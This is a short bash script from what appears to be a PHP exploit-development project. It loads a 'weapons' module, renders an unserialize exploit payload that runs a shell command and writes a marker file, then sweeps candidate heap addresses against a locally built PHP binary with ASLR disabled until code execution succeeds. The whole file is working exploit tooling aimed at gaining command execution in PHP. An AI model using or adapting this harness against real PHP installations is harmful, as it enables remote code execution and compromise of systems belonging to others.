#!/bin/bash
# Wide sweep: weapon-exact render (marker=/tmp/.p2s_pwn, cmdfile=/tmp/.p2s_cmd),
# inherited bash env, cwd=/tmp/dbg_zero5, chunks 1..3 wide offsets.
set -u
PHP=/tmp/php8512_build/plain2/sapi/cli/php
W=/tmp/dbg_zero5
rm -rf $W; mkdir -p $W
python3 - "$W" <<'PYEOF'
import sys
w = sys.argv[1]
import importlib.util
spec = importlib.util.spec_from_file_location("pw", "/mnt/c/Users/andre/Downloads/php2shell-zeros/weapons/pwn_unserialize.py")
pw = importlib.util.module_from_spec(spec)
spec.loader.exec_module(pw)
s = pw.ZERO5_CARRIER.replace("__MARKER__", "/tmp/.p2s_pwn")
s = s.replace("__CMDFILE__", "/tmp/.p2s_cmd")
s = s.replace("__CMD__", "id").replace("__CMDTEXT__", "sh /tmp/.p2s_cmd")
open(w + "/sr2_call.php", "w").write(s)
print("rendered ok")
PYEOF
cd $W
ZIF=0093824996228192
for chunk in 0x7ffff5400000 0x7ffff5200000 0x7ffff5000000; do
  for off in 60000 64000 68000 6c000 70000 74000 78000 7c000 80000 84000 88000 8c000 90000 94000 98000 9c000 a0000 a4000 a8000 ac000 b0000; do
    base=$(( $chunk + 0x$off ))
    dec=$(printf "%016d" $base)
    rm -f /tmp/.p2s_pwn /tmp/.p2s_cmd
    timeout 30 setarch x86_64 -R $PHP -n sr2_call.php "$dec" "$ZIF" >/dev/null 2>&1
    rc=$?
    if [ -f /tmp/.p2s_pwn ]; then echo "HIT chunk=$(printf 0x%x $chunk)+0x$off rc=$rc :: $(cat /tmp/.p2s_pwn)"; exit 0; fi
    [ $rc -ne 0 ] && echo "rc=$rc at chunk=$(printf 0x%x $chunk)+0x$off"
  done
done
echo "NO HIT in wide sweep"
